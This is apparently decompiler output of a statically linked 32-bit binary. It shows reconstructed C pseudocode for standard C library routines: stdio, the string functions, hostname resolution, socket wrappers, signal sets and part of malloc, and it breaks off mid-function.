// 8068240: using guessed type int stdio_openlist_use_count;

//----- (080515F0) --------------------------------------------------------
char *__cdecl fgets_unlocked(char *a1, int a2, unsigned int *a3)
{
  char *v3; // edi@1
  int v4; // esi@1
  char *v5; // ebx@1
  char *v6; // eax@3
  char v7; // dl@4
  bool v8; // zf@4
  signed int v9; // eax@5

  v3 = a1;
  v4 = a2;
  v5 = a1;
  if ( a2 <= 0 )
    return 0;
  do
  {
    if ( !--v4 )
      break;
    v6 = (char *)a3[4];
    if ( (unsigned int)v6 >= a3[6] )
    {
      v9 = getc_unlocked(a3);
      if ( v9 == -1 )
      {
        if ( *(_BYTE *)a3 & 8 )
          return 0;
        break;
      }
      *v5++ = v9;
      v8 = (_BYTE)v9 == 10;
    }
    else
    {
      v7 = *v6;
      *v5++ = *v6;
      v8 = v7 == 10;
      a3[4] = (unsigned int)(v6 + 1);
    }
  }
  while ( !v8 );
  if ( v5 <= a1 )
    return 0;
  *v5 = 0;
  return v3;
}

//----- (0805165C) --------------------------------------------------------
signed int __cdecl fputs_unlocked(char *a1, size_t len)
{
  int v2; // eax@1
  int v3; // esi@1
  size_t v4; // eax@1
  signed int v5; // edx@1

  v2 = strlen(a1);
  v3 = v2;
  v4 = fwrite_unlocked(a1, 1, v2, len);
  v5 = -1;
  if ( v4 == v3 )
    v5 = v4;
  return v5;
}

//----- (08051690) --------------------------------------------------------
size_t __cdecl fwrite_unlocked(void *a1, int a2, int a3, size_t len)
{
  if ( ((*(_WORD *)len & 0xC0) == 192 || !_stdio_trans2w_o((unsigned int *)len, 128)) && a2 && a3 )
  {
    if ( a3 <= 0xFFFFFFFF / a2 )
      return _stdio_fwrite(a1, (void *)(a3 * a2), len) / a2;
    *(_WORD *)len |= 8u;
    *(_DWORD *)_errno_location() = 22;
  }
  return 0;
}

//----- (08051704) --------------------------------------------------------
char *__cdecl memcpy(char *a1, char *a2, unsigned int a3)
{
  char *v3; // edi@1
  char *v4; // esi@1

  qmemcpy(a1, a2, 4 * (a3 >> 2));
  v4 = &a2[4 * (a3 >> 2)];
  v3 = &a1[4 * (a3 >> 2)];
  if ( a3 & 2 )
  {
    *(_WORD *)v3 = *(_WORD *)v4;
    v4 += 2;
    v3 += 2;
  }
  if ( a3 & 1 )
    *v3 = *v4;
  return a1;
}

//----- (0805172C) --------------------------------------------------------
void *__cdecl memset(void *a1, char a2, unsigned int a3)
{
  memset(a1, a2, a3);
  return a1;
}

//----- (08051744) --------------------------------------------------------
const char *__cdecl strcat(const char *a1, char *a2)
{
  char *v2; // esi@1
  char *v3; // edi@1
  char v4; // al@2

  v2 = a2;
  v3 = (char *)&a1[strlen(a1)];
  do
  {
    v4 = *v2++;
    *v3++ = v4;
  }
  while ( v4 );
  return a1;
}

//----- (08051764) --------------------------------------------------------
_BYTE *__cdecl strcpy(_BYTE *a1, char *a2)
{
  char *v2; // esi@1
  _BYTE *v3; // edi@1
  char v4; // al@2

  v2 = a2;
  v3 = a1;
  do
  {
    v4 = *v2++;
    *v3++ = v4;
  }
  while ( v4 );
  return a1;
}

//----- (08051780) --------------------------------------------------------
unsigned int __cdecl strlen(const char *a1)
{
  return strlen(a1);
}

//----- (08051794) --------------------------------------------------------
_BYTE *__cdecl strncpy(_BYTE *a1, char *a2, int a3)
{
  char *v3; // esi@1
  _BYTE *v4; // edi@1
  int v5; // ecx@1
  char v6; // al@3

  v3 = a2;
  v4 = a1;
  v5 = a3 + 1;
  while ( --v5 )
  {
    v6 = *v3++;
    *v4++ = v6;
    if ( !v6 )
    {
      memset(v4, 0, v5 - 1);
      return a1;
    }
  }
  return a1;
}

//----- (080517BC) --------------------------------------------------------
int __cdecl strnlen(_BYTE *a1, int a2)
{
  _BYTE *v2; // eax@1
  int v3; // edx@1

  v2 = a1;
  v3 = a2 + 1;
  while ( --v3 && *v2 )
    ++v2;
  return v2 - a1;
}

//----- (080517D8) --------------------------------------------------------
unsigned __int8 *__cdecl strstr(unsigned __int8 *a1, unsigned __int8 *a2)
{
  unsigned __int8 *v2; // ebx@1
  int v3; // ebp@1
  int v4; // eax@6
  unsigned __int8 *v5; // ecx@6
  bool i; // zf@6
  int v7; // eax@15
  int v8; // edx@15
  unsigned __int8 *v9; // edi@15
  unsigned __int8 *v10; // esi@15

  v2 = a1;
  v3 = *a2;
  if ( *a2 )
  {
    v2 = a1 - 1;
    do
    {
      if ( !*++v2 )
        return 0;
    }
    while ( *v2 != v3 );
    if ( a2[1] )
    {
      v4 = v2[1];
      v5 = v2 + 1;
      for ( i = v4 == a2[1]; !i; i = v4 == a2[1] )
      {
LABEL_12:
        while ( v4 != v3 )
        {
          if ( !v4 )
            return 0;
          if ( *++v5 == v3 )
            break;
          if ( !*v5 )
            return 0;
          v4 = *++v5;
        }
        v4 = *++v5;
      }
      v7 = v5[1];
      v8 = a2[2];
      v9 = a2 + 2;
      v10 = v5 + 1;
      v2 = v5 - 1;
      if ( v7 == v8 )
      {
        while ( v7 )
        {
          v8 = v9[1];
          if ( v10[1] != v8 )
            goto LABEL_21;
          if ( !v9[1] )
            break;
          v10 += 2;
          v9 += 2;
          v8 = *v9;
          if ( *v10 != v8 )
            goto LABEL_21;
          v7 = *v9;
        }
      }
      else
      {
LABEL_21:
        if ( v8 )
        {
          v4 = *v5;
          goto LABEL_12;
        }
      }
    }
  }
  return v2;
}

//----- (080518A0) --------------------------------------------------------
char *__cdecl _glibc_strerror_r(unsigned int a1, char *a2, unsigned int a3)
{
  strerror_r(a1, a2, a3);
  return a2;
}

//----- (080518C0) --------------------------------------------------------
signed int __cdecl strerror_r(unsigned int a1, char *a2, unsigned int a3)
{
  unsigned int v3; // ecx@2
  char *v4; // esi@2
  signed int v5; // ebp@5
  unsigned int v6; // ebx@7
  char v8; // [esp+4Bh] [ebp-11h]@6

  if ( a1 > 0x7C )
    goto LABEL_16;
  v3 = a1;
  v4 = "Success";
  while ( v3 )
    v3 -= (unsigned __int8)*v4++ < 1u;
  v5 = 0;
  if ( !*v4 )
  {
LABEL_16:
    v5 = 22;
    v4 = uintmaxtostr(&v8, (signed int)a1, -10, 0) - 14;
    memcpy(v4, "Unknown error ", 0xEu);
  }
  v6 = strlen(v4) + 1;
  if ( v6 > (a2 != 0 ? a3 : 0) )
  {
    v6 = a2 != 0 ? a3 : 0;
    v5 = 34;
  }
  if ( v6 )
  {
    memcpy(a2, v4, v6);
    a2[v6 - 1] = 0;
  }
  if ( v5 )
    *(_DWORD *)_errno_location() = v5;
  return v5;
}

//----- (08051978) --------------------------------------------------------
char *__cdecl bcopy(char *a1, char *a2, unsigned int a3)
{
  return memmove(a2, a1, a3);
}

//----- (08051990) --------------------------------------------------------
int __cdecl strcasecmp(unsigned __int8 *a1, unsigned __int8 *a2)
{
  unsigned __int8 *v2; // ecx@1
  unsigned __int8 *v3; // ebx@1
  int result; // eax@1

  v2 = a1;
  v3 = a2;
  result = 0;
  while ( 1 )
  {
    if ( v2 != v3 )
    {
      result = *((signed __int16 *)_ctype_tolower + *v2) - *((signed __int16 *)_ctype_tolower + *v3);
      if ( *((signed __int16 *)_ctype_tolower + *v2) != *((signed __int16 *)_ctype_tolower + *v3) )
        break;
    }
    if ( !*v2 )
      break;
    ++v3;
    ++v2;
  }
  return result;
}
// 8061BE8: using guessed type void *_ctype_tolower;

//----- (080519C8) --------------------------------------------------------
char *__usercall strdup@<eax>(off_t a1@<ebp>, char *a2)
{
  unsigned int v2; // eax@1
  unsigned int v3; // esi@1
  char *v4; // eax@1
  char *v5; // ebx@1

  v2 = strlen(a2);
  v3 = v2 + 1;
  v4 = (char *)malloc(a1, (int)a2, v2 + 1);
  v5 = v4;
  if ( v4 )
    memcpy(v4, a2, v3);
  return v5;
}

//----- (08051A00) --------------------------------------------------------
char *__cdecl strtok(char *a1, _BYTE *a2)
{
  return strtok_r(a1, a2, (char **)&next_start_1109);
}

//----- (08051A1C) --------------------------------------------------------
_BOOL4 __cdecl isatty(int d)
{
  int v2; // [esp+18h] [ebp-3Ch]@1

  return tcgetattr(d, (int)&v2) == 0;
}

//----- (08051A3C) --------------------------------------------------------
unsigned int __cdecl _libc_tcdrain(int d)
{
  return ioctl(d, 21513);
}

//----- (08051A54) --------------------------------------------------------
unsigned int __cdecl tcgetattr(int d, int a2)
{
  unsigned int v2; // esi@1
  void *v3; // eax@2
  int v5; // [esp+14h] [ebp-2Ch]@2
  int v6; // [esp+18h] [ebp-28h]@2
  int v7; // [esp+1Ch] [ebp-24h]@2
  int v8; // [esp+20h] [ebp-20h]@2
  char v9; // [esp+24h] [ebp-1Ch]@2
  char v10; // [esp+25h] [ebp-1Bh]@2

  v2 = ioctl(d, 21505);
  if ( !v2 )
  {
    *(_DWORD *)a2 = v5;
    *(_DWORD *)(a2 + 4) = v6;
    *(_DWORD *)(a2 + 8) = v7;
    *(_DWORD *)(a2 + 12) = v8;
    *(_BYTE *)(a2 + 16) = v9;
    v3 = (void *)mempcpy((char *)(a2 + 17), &v10, 0x13u);
    memset(v3, 0, 0xDu);
  }
  return v2;
}

//----- (08051AC4) --------------------------------------------------------
int __cdecl htons(__int16 a1)
{
  int result; // eax@1

  LOWORD(result) = __ROR2__(a1, 8);
  return (unsigned __int16)result;
}

//----- (08051AD0) --------------------------------------------------------
unsigned __int32 __cdecl htonl(unsigned int a1)
{
  return _byteswap_ulong(a1);
}

//----- (08051AD7) --------------------------------------------------------
int __cdecl ntohs(__int16 a1)
{
  int result; // eax@1

  LOWORD(result) = __ROR2__(a1, 8);
  return (unsigned __int16)result;
}

//----- (08051AE3) --------------------------------------------------------
unsigned __int32 __cdecl ntohl(unsigned int a1)
{
  return _byteswap_ulong(a1);
}

//----- (08051AEC) --------------------------------------------------------
signed int __cdecl inet_network(unsigned __int8 *a1)
{
  unsigned __int8 *v1; // ecx@1
  signed int v2; // esi@3
  signed int v3; // ebp@3
  unsigned int v4; // edi@8
  __int16 v5; // ax@9
  unsigned __int8 v6; // dl@18
  int v8; // [esp+0h] [ebp-18h]@1
  int v9; // [esp+4h] [ebp-14h]@1

  v1 = a1;
  v8 = 0;
  v9 = 0;
  while ( 2 )
  {
    if ( *v1 == 48 )
    {
      if ( *++v1 == 120 || *v1 == 88 )
      {
        ++v1;
        v2 = 0;
        v3 = 16;
      }
      else
      {
        v2 = 1;
        v3 = 8;
      }
    }
    else
    {
      v2 = 0;
      v3 = 10;
    }
    v4 = 0;
    while ( 1 )
    {
      v6 = *v1;
      if ( !*v1 )
        break;
      v5 = *((_WORD *)_ctype_b + v6);
      if ( v5 & 8 )
      {
        if ( v3 == 8 && v6 > 0x37u )
          return -1;
        v4 = v3 * v4 + v6 - 48;
      }
      else
      {
        if ( v3 != 16 || !(v5 & 0x10) )
          break;
        v4 = ((v5 & 2u) < 1 ? 0x20 : 0) + 16 * v4 - 87;
      }
      if ( v4 > 0xFF )
        return -1;
      ++v1;
      v2 = 1;
    }
    if ( v2 )
    {
      if ( v8 )
        v9 <<= 8;
      v9 |= v4;
      if ( v6 == 46 )
      {
        if ( ++v8 != 4 )
        {
          ++v1;
          continue;
        }
      }
      else if ( !v6 )
      {
        return v9;
      }
    }
    break;
  }
  return -1;
}
// 8061BE0: using guessed type void *_ctype_b;

//----- (08051BCC) --------------------------------------------------------
signed int __cdecl inet_addr(char *a1)
{
  signed int v1; // eax@1
  signed int v2; // edx@1
  int v4; // [esp+20h] [ebp-4h]@1

  v1 = inet_aton(a1, &v4);
  v2 = -1;
  if ( v1 )
    v2 = v4;
  return v2;
}

//----- (08051BF4) --------------------------------------------------------
int __cdecl gethostbyname(unsigned __int8 *a1)
{
  int *v1; // eax@1
  int v3; // [esp+18h] [ebp-4h]@1

  v1 = (int *)_GI___h_errno_location();
  gethostbyname_r(a1, &h_4992, (int)&buf_4993, 0x1CCu, &v3, v1);
  return v3;
}

//----- (08051C24) --------------------------------------------------------
signed int __cdecl gethostbyname_r(unsigned __int8 *a1, _DWORD *a2, int a3, unsigned int a4, _DWORD *a5, int *a6)
{
  int v6; // ebp@1
  unsigned int v7; // ebx@1
  signed int result; // eax@1
  _DWORD *v9; // eax@2
  _DWORD *v10; // esi@2
  int v11; // edi@2
  int v12; // edx@3
  unsigned int v13; // eax@7
  _BYTE *v14; // edi@14
  int v15; // esi@16
  int i; // edx@21
  int v17; // eax@24
  int v18; // ecx@24
  int *v19; // [esp+10h] [ebp-5Ch]@12
  unsigned int v20; // [esp+14h] [ebp-58h]@13
  int v21; // [esp+18h] [ebp-54h]@14
  char *v22; // [esp+20h] [ebp-4Ch]@16
  int v23; // [esp+24h] [ebp-48h]@25
  int v24; // [esp+30h] [ebp-3Ch]@18
  char *v25; // [esp+34h] [ebp-38h]@26
  int v26; // [esp+3Ch] [ebp-30h]@16
  unsigned int v27; // [esp+40h] [ebp-2Ch]@16
  int v28; // [esp+44h] [ebp-28h]@16
  char v29; // [esp+48h] [ebp-24h]@16
  _DWORD *v30; // [esp+58h] [ebp-14h]@16

  v6 = a3;
  v7 = a4;
  *a5 = 0;
  result = 22;
  if ( !a1 )
    return result;
  v9 = _errno_location();
  v10 = v9;
  v11 = *v9;
  *v9 = 0;
  result = _get_hosts_byname_r(a1, 2, a2, a3, a4, a5, a6);
  if ( !result )
    return result;
  v12 = *a6;
  if ( *a6 != 1 && v12 != 4 && (v12 != -1 || *v10 != 2) )
    return result;
  *v10 = v11;
  v13 = -a3 & 3;
  if ( v13 )
  {
    if ( a4 < v13 )
      return 34;
    v6 = v13 + a3;
    v7 = a4 - v13;
  }
  *a6 = -1;
  if ( v7 <= 3 )
    return 34;
  if ( v7 - 4 <= 7 )
    return 34;
  v19 = (int *)(v6 + 4);
  *(_DWORD *)(v6 + 4) = v6;
  *(_DWORD *)(v6 + 8) = 0;
  if ( v7 - 12 <= 0x1F )
    return 34;
  v20 = v7 - 44;
  if ( v7 - 44 <= 0xFF )
    return 34;
  v14 = (_BYTE *)(v6 + 44);
  v21 = v6 + 12;
  strncpy((_BYTE *)(v6 + 44), (char *)a1, v20);
  *(_DWORD *)(v6 + 12) = v6 + 44;
  *(_DWORD *)(v6 + 16) = 0;
  if ( inet_aton((char *)a1, (_DWORD *)v6) )
  {
    *a2 = v14;
    a2[2] = 2;
    a2[3] = 4;
    a2[4] = v19;
    a2[1] = v21;
    *a5 = a2;
    *a6 = 0;
    result = 0;
  }
  else
  {
    _open_nameservers((unsigned int *)v6);
    pthread_cleanup_push_defer(&v29, (int)pthread_mutex_unlock, (int)&_resolv_lock);
    pthread_mutex_lock((int)&_resolv_lock);
    v15 = _nameservers;
    pthread_cleanup_pop_restore(v6, (int)&v29, 1);
    v26 = v6 + 44;
    v27 = v7 - 44;
    v28 = 0;
    if ( _dns_lookup(v6, (char *)a1, 1, v15, (int)_nameserver, &v30, (char *)&v22) >= 0 )
    {
      if ( v28 * (v24 + 4) + 256 <= v20 )
      {
        if ( v28 )
        {
          memmove((char *)(v6 + 36), (char *)(v6 + 44), v24 * v28);
          v19 = (int *)&v14[v24 * v28];
          *v19 = v6;
          for ( i = v28 - 1; i >= 0; --i )
            v19[i + 1] = (int)&v14[v24 * i - 8];
          v19[v28 + 1] = 0;
          v17 = (int)&v19[v28];
          v18 = (int)&v14[v20 - v17 - 8];
          v14 = (_BYTE *)(v17 + 8);
          v20 = v18;
        }
        strncpy(v14, v22, v20);
        free(v6, v22);
        if ( v23 == 1 )
        {
          memcpy((char *)v6, v25, 4u);
          *a2 = v14;
          a2[2] = 2;
          a2[3] = 4;
          a2[4] = v19;
          a2[1] = v21;
          free(v6, v30);
          *a5 = a2;
          result = 0;
          *a6 = 0;
        }
        else
        {
          free(v6, v30);
          *a6 = 1;
          result = 2;
        }
      }
      else
      {
        free(v6, v22);
        free(v6, v30);
        *a6 = -1;
        result = 34;
      }
    }
    else
    {
      result = 2;
      *a6 = 1;
    }
  }
  return result;
}
// 806AA54: using guessed type int _nameserver[];
// 806AA60: using guessed type int _nameservers;

//----- (08051F58) --------------------------------------------------------
signed int __cdecl _libc_accept(int a1, int a2, int a3)
{
  int v4; // [esp+18h] [ebp-Ch]@1
  int v5; // [esp+1Ch] [ebp-8h]@1
  int v6; // [esp+20h] [ebp-4h]@1

  v4 = a1;
  v5 = a2;
  v6 = a3;
  return _socketcall();
}

//----- (08051F84) --------------------------------------------------------
signed int __cdecl bind(int a1, int a2, int a3)
{
  int v4; // [esp+18h] [ebp-Ch]@1
  int v5; // [esp+1Ch] [ebp-8h]@1
  int v6; // [esp+20h] [ebp-4h]@1

  v4 = a1;
  v5 = a2;
  v6 = a3;
  return _socketcall();
}

//----- (08051FB0) --------------------------------------------------------
signed int __cdecl _libc_connect(int a1, int a2, int a3)
{
  int v4; // [esp+18h] [ebp-Ch]@1
  int v5; // [esp+1Ch] [ebp-8h]@1
  int v6; // [esp+20h] [ebp-4h]@1

  v4 = a1;
  v5 = a2;
  v6 = a3;
  return _socketcall();
}

//----- (08051FDC) --------------------------------------------------------
signed int __cdecl getsockname(int a1, int a2, int a3)
{
  int v4; // [esp+18h] [ebp-Ch]@1
  int v5; // [esp+1Ch] [ebp-8h]@1
  int v6; // [esp+20h] [ebp-4h]@1

  v4 = a1;
  v5 = a2;
  v6 = a3;
  return _socketcall();
}

//----- (08052008) --------------------------------------------------------
signed int __cdecl listen(int a1, int a2)
{
  int v3; // [esp+1Ch] [ebp-8h]@1
  int v4; // [esp+20h] [ebp-4h]@1

  v3 = a1;
  v4 = a2;
  return _socketcall();
}

//----- (0805202C) --------------------------------------------------------
signed int __cdecl _libc_recv(int a1, int a2, int a3, int a4)
{
  int v5; // [esp+14h] [ebp-10h]@1
  int v6; // [esp+18h] [ebp-Ch]@1
  int v7; // [esp+1Ch] [ebp-8h]@1
  int v8; // [esp+20h] [ebp-4h]@1

  v5 = a1;
  v6 = a2;
  v7 = a3;
  v8 = a4;
  return _socketcall();
}

//----- (08052060) --------------------------------------------------------
signed int __cdecl _libc_recvfrom(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // [esp+1Ch] [ebp-18h]@1
  int v8; // [esp+20h] [ebp-14h]@1
  int v9; // [esp+24h] [ebp-10h]@1
  int v10; // [esp+28h] [ebp-Ch]@1
  int v11; // [esp+2Ch] [ebp-8h]@1
  int v12; // [esp+30h] [ebp-4h]@1

  v7 = a1;
  v8 = a2;
  v9 = a3;
  v10 = a4;
  v11 = a5;
  v12 = a6;
  return _socketcall();
}

//----- (080520A4) --------------------------------------------------------
signed int __cdecl _libc_recvmsg(int a1, int a2, int a3)
{
  int v4; // [esp+18h] [ebp-Ch]@1
  int v5; // [esp+1Ch] [ebp-8h]@1
  int v6; // [esp+20h] [ebp-4h]@1

  v4 = a1;
  v5 = a2;
  v6 = a3;
  return _socketcall();
}

//----- (080520D0) --------------------------------------------------------
signed int __cdecl _libc_send(int a1, int a2, int a3, int a4)
{
  int v5; // [esp+14h] [ebp-10h]@1
  int v6; // [esp+18h] [ebp-Ch]@1
  int v7; // [esp+1Ch] [ebp-8h]@1
  int v8; // [esp+20h] [ebp-4h]@1

  v5 = a1;
  v6 = a2;
  v7 = a3;
  v8 = a4;
  return _socketcall();
}

//----- (08052104) --------------------------------------------------------
signed int __cdecl _libc_sendmsg(int a1, int a2, int a3)
{
  int v4; // [esp+18h] [ebp-Ch]@1
  int v5; // [esp+1Ch] [ebp-8h]@1
  int v6; // [esp+20h] [ebp-4h]@1

  v4 = a1;
  v5 = a2;
  v6 = a3;
  return _socketcall();
}

//----- (08052130) --------------------------------------------------------
signed int __cdecl _libc_sendto(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // [esp+1Ch] [ebp-18h]@1
  int v8; // [esp+20h] [ebp-14h]@1
  int v9; // [esp+24h] [ebp-10h]@1
  int v10; // [esp+28h] [ebp-Ch]@1
  int v11; // [esp+2Ch] [ebp-8h]@1
  int v12; // [esp+30h] [ebp-4h]@1

  v7 = a1;
  v8 = a2;
  v9 = a3;
  v10 = a4;
  v11 = a5;
  v12 = a6;
  return _socketcall();
}

//----- (08052174) --------------------------------------------------------
signed int __cdecl setsockopt(int a1, int a2, int a3, int a4, int a5)
{
  int v6; // [esp+20h] [ebp-14h]@1
  int v7; // [esp+24h] [ebp-10h]@1
  int v8; // [esp+28h] [ebp-Ch]@1
  int v9; // [esp+2Ch] [ebp-8h]@1
  int v10; // [esp+30h] [ebp-4h]@1

  v6 = a1;
  v7 = a2;
  v8 = a3;
  v9 = a4;
  v10 = a5;
  return _socketcall();
}

//----- (080521B0) --------------------------------------------------------
signed int __cdecl socket(int a1, int a2, int a3)
{
  int v4; // [esp+18h] [ebp-Ch]@1
  int v5; // [esp+1Ch] [ebp-8h]@1
  int v6; // [esp+20h] [ebp-4h]@1

  v4 = a1;
  v5 = a2;
  v6 = a3;
  return _socketcall();
}

//----- (080521DC) --------------------------------------------------------
int __cdecl sigaddset(int a1, int a2)
{
  if ( a2 > 0 && a2 <= 64 )
    return _sigaddset(a1, a2);
  *(_DWORD *)_errno_location() = 22;
  return -1;
}

//----- (08052208) --------------------------------------------------------
int __cdecl sigdelset(int a1, int a2)
{
  if ( a2 > 0 && a2 <= 64 )
    return _sigdelset(a1, a2);
  *(_DWORD *)_errno_location() = 22;
  return -1;
}

//----- (08052234) --------------------------------------------------------
int __cdecl sigemptyset(void *a1)
{
  memset(a1, 0, 0x80u);
  return 0;
}

//----- (08052250) --------------------------------------------------------
int __cdecl sigfillset(void *a1)
{
  memset(a1, 255, 0x80u);
  return 0;
}

//----- (0805226C) --------------------------------------------------------
signed int __cdecl sigismember(int a1, int a2)
{
  if ( a2 > 0 && a2 <= 64 )
    return _sigismember(a1, a2);
  *(_DWORD *)_errno_location() = 22;
  return -1;
}

//----- (08052298) --------------------------------------------------------
int __cdecl _sigjmp_save(int a1, int a2)
{
  signed int v2; // eax@2
  signed int v3; // edx@2

  if ( !a2 || (v2 = sigprocmask(0, 0), v3 = 1, v2) )
    v3 = 0;
  *(_DWORD *)(a1 + 24) = v3;
  return 0;
}

//----- (080522CC) --------------------------------------------------------
_BOOL4 __cdecl _sigismember(int a1, int a2)
{
  return ((1 << ((a2 - 1) & 0x1F)) & *(_DWORD *)(a1 + 4 * ((unsigned int)(a2 - 1) >> 5))) != 0;
}

//----- (080522F0) --------------------------------------------------------
int __cdecl _sigaddset(int a1, int a2)
{
  *(_DWORD *)(a1 + 4 * ((unsigned int)(a2 - 1) >> 5)) |= 1 << ((a2 - 1) & 0x1F);
  return 0;
}

//----- (08052310) --------------------------------------------------------
int __cdecl _sigdelset(int a1, int a2)
{
  int v2; // eax@1

  v2 = __ROL4__(-2, (a2 - 1) & 0x1F);
  *(_DWORD *)(a1 + 4 * ((unsigned int)(a2 - 1) >> 5)) &= v2;
  return 0;
}

//----- (08052330) --------------------------------------------------------
int __usercall _malloc_largebin_index@<eax>(unsigned int a1@<eax>)
{
  unsigned int v1; // edx@1
  unsigned int v2; // ebx@1
  bool v3; // cf@1
  bool v4; // zf@1
  int result; // eax@1
  int v6; // eax@2

  v1 = a1 >> 8;
  v2 = a1;
  v3 = a1 >> 8 < 0xFFFF;
  v4 = a1 >> 8 == 0xFFFF;
  result = 95;
  if ( v3 || v4 )
  {
    _BitScanReverse((unsigned int *)&v6, v1);
    result = ((v2 >> (v6 + 6)) & 3) + 4 * v6 + 32;
  }
  return result;
}

//----- (08052356) --------------------------------------------------------
int __usercall malloc@<eax>(off_t a1@<ebp>, int a2@<edi>, unsigned int a3)
{
  int v3; // ebx@2
  char v4; // bl@5
  char *v5; // ecx@9
  int *v6; // edx@9
  int *v7; // ecx@12
  int v8; // eax@13
  int v9; // edx@17
  unsigned int v10; // edi@17
  signed int v11; // esi@23
  int *v12; // ebx@23
  int *v13; // eax@23
  int v14; // eax@24
  int *v15; // edx@34
  int *i; // eax@34
  int v17; // ecx@35
  unsigned int v18; // ebx@35
  int v19; // edx@36
  int v20; // esi@39
  _DWORD *v21; // edx@40
  int *v22; // ebx@43
  unsigned int v23; // edx@43
  unsigned int v24; // esi@43
  int *v25; // ecx@51
  int v26; // eax@53
  unsigned int v27; // edx@53
  int v28; // esi@53
  _DWORD *v29; // edx@55
  int v30; // ebx@59
  unsigned int v31; // ecx@59
  int v32; // edx@60
  int v33; // ecx@60
  size_t v34; // ecx@63
  unsigned int v35; // ebx@63
  int v36; // eax@66
  int v37; // ecx@67
  int v38; // eax@68
  int v39; // eax@70
  unsigned int v40; // eax@72
  unsigned int v41; // eax@74
  int v42; // eax@76
  int v43; // eax@78
  unsigned int v44; // esi@78
  int v45; // eax@79
  int v46; // edx@79
  int v47; // eax@85
  unsigned __int32 v48; // ecx@88
  int v49; // edx@98
  int v50; // edi@99
  int v51; // eax@99
  int v52; // esi@101
  int v53; // esi@101
  unsigned int v54; // eax@101
  unsigned __int32 v55; // eax@112
  int v56; // ebx@113
  unsigned int v57; // ecx@118
  _DWORD *v58; // edx@121
  int *v60; // [esp+1Ch] [ebp-40h]@24
  unsigned int v61; // [esp+24h] [ebp-38h]@3
  int v62; // [esp+28h] [ebp-34h]@63
  int v63; // [esp+2Ch] [ebp-30h]@76
  int v64; // [esp+30h] [ebp-2Ch]@78
  unsigned int v65; // [esp+34h] [ebp-28h]@12
  int v66; // [esp+38h] [ebp-24h]@101
  char v67; // [esp+3Ch] [ebp-20h]@1

  pthread_cleanup_push_defer(&v67, (int)pthread_mutex_unlock, (int)&_malloc_lock);
  pthread_mutex_lock((int)&_malloc_lock);
  if ( a3 > 0xFFFFFFDF )
  {
    v3 = 0;
    *(_DWORD *)_errno_location() = 12;
    return v3;
  }
  v61 = 16;
  if ( a3 + 11 > 0xF )
    v61 = (a3 + 11) & 0xFFFFFFF8;
  v4 = _malloc_state[0];
  if ( !(_malloc_state[0] & 1) )
  {
    if ( !_malloc_state[0] )
      _malloc_consolidate(_malloc_state);
    goto LABEL_59;
  }
  if ( v61 <= _malloc_state[0] )
  {
    v5 = (char *)_malloc_state + (v61 >> 1);
    v6 = (int *)*((_DWORD *)v5 - 1);
    if ( v6 )
    {
      *((_DWORD *)v5 - 1) = v6[2];
LABEL_14:
      v3 = (int)(v6 + 2);
      goto LABEL_127;
    }
  }
  if ( v61 <= 0xFF )
  {
    v65 = v61 >> 3;
    v7 = &dword_806A64C[2 * (v61 >> 3)];
    v6 = (int *)v7[3];
    if ( v6 == v7 )
      goto LABEL_32;
    v8 = v6[3];
    v7[3] = v8;
    *(int *)((char *)v6 + v61 + 4) |= 1u;
    *(_DWORD *)(v8 + 8) = v7;
    goto LABEL_14;
  }
  v65 = _malloc_largebin_index(v61);
  if ( v4 & 2 )
    _malloc_consolidate(_malloc_state);
LABEL_32:
  while ( 1 )
  {
    a1 = dword_806A660;
    if ( (_UNKNOWN *)dword_806A660 == &unk_806A654 )
      break;
    v9 = *(_DWORD *)(dword_806A660 + 12);
    v10 = *(_DWORD *)(dword_806A660 + 4) & 0xFFFFFFFC;
    if ( v61 <= 0xFF && (_UNKNOWN *)v9 == &unk_806A654 && dword_806A660 == dword_806A650 && v10 > v61 + 16 )
    {
      v58 = (_DWORD *)(dword_806A660 + v61);
      dword_806A650 = dword_806A660 + v61;
      *(_DWORD *)(dword_806A660 + 4) = v61 | 1;
      dword_806A65C = (int)v58;
      dword_806A660 = (int)v58;
      v58[2] = &unk_806A654;
      v58[3] = &unk_806A654;
      v58[1] = (v10 - v61) | 1;
      *(_DWORD *)((char *)v58 + v10 - v61) = v10 - v61;
LABEL_123:
      v3 = a1 + 8;
      goto LABEL_127;
    }
    *(_DWORD *)(v9 + 8) = &unk_806A654;
    *((_DWORD *)&unk_806A654 + 3) = v9;
    if ( v10 == v61 )
    {
      *(_DWORD *)(a1 + v61 + 4) |= 1u;
      goto LABEL_123;
    }
    if ( v10 <= 0xFF )
    {
      v11 = v10 >> 3;
      v12 = &dword_806A64C[2 * (v10 >> 3)];
      v13 = (int *)v12[2];
LABEL_26:
      v60 = v13;
      goto LABEL_31;
    }
    v14 = _malloc_largebin_index(v10);
    v11 = v14;
    v13 = &dword_806A64C[2 * v14];
    v60 = (int *)v13[2];
    v12 = v60;
    if ( v60 == v13 )
      goto LABEL_31;
    v12 = (int *)v13[3];
    if ( v10 < v12[1] )
      goto LABEL_26;
    while ( (v10 | 1) < v60[1] )
      v60 = (int *)v60[2];
    v12 = (int *)v60[3];
LABEL_31:
    dword_806A954[v11 >> 5] |= 1 << (v11 & 0x1F);
    *(_DWORD *)(a1 + 12) = v12;
    *(_DWORD *)(a1 + 8) = v60;
    v12[2] = a1;
    v60[3] = a1;
  }
  if ( v61 > 0xFF )
  {
    v15 = &dword_806A64C[2 * v65];
    for ( i = (int *)v15[3]; i != v15; i = (int *)i[3] )
    {
      v17 = i[3];
      v18 = i[1] & 0xFFFFFFFC;
      if ( v18 >= v61 )
      {
        v19 = i[2];
        if ( *(int **)(v19 + 12) != i || *(int **)(v17 + 8) != i )
          abort();
        v20 = v18 - v61;
        *(_DWORD *)(v19 + 12) = v17;
        *(_DWORD *)(v17 + 8) = v19;
        if ( v18 - v61 <= 0xF )
        {
          *(int *)((char *)i + v18 + 4) |= 1u;
        }
        else
        {
          v21 = (int *)((char *)i + v61);
          i[1] = v61 | 1;
          *(_DWORD *)(a1 + 8) = (char *)i + v61;
          *(_DWORD *)(a1 + 12) = (char *)i + v61;
          v21[2] = &unk_806A654;
          v21[3] = &unk_806A654;
          v21[1] = v20 | 1;
          *(_DWORD *)((char *)v21 + v20) = v20;
        }
        v3 = (int)(i + 2);
        goto LABEL_127;
      }
    }
  }
  a2 = (v65 + 1) >> 5;
  v22 = &dword_806A64C[2 * (v65 + 1)];
  v23 = dword_806A954[a2];
  v24 = 1 << ((v65 + 1) & 0x1F);
  while ( v24 <= v23 && v24 )
  {
LABEL_50:
    while ( !(v24 & v23) )
    {
